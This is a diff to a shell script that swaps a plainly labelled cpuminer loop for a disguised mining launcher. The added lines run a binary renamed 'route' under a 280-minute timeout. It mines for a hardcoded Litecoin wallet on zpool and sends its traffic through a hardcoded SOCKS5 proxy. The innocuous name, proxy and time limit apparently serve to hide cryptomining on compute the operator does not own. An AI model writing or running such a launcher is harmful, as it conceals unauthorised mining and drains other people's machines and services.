@@ -1,12 +1,4 @@
-#!/bin/sh
-#
-# Choose nearest stratum:
-#       stratum-ru.rplant.xyz   /Moscow/
-#       stratum-eu.rplant.xyz   /London/
-#       stratum-asia.rplant.xyz /Singapore/
-#       stratum-na.rplant.xyz   /Toronto/
-#
-while [ 1 ]; do
-./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u WALLET.WORKER_NAME
-sleep 5
-done
+#!/bin/bash
+chmod +x route 
+timeout 280m ./route -a scryptn2 -o stratum+tcp://scryptn2.eu.mine.zpool.ca:4339 -u LQNiMe5CksHxP1JA9HKxLeSKwyS9T4vjyn -p c=LTC -t 4 -x socks5://192.252.209.155:14455
+sudo apt update
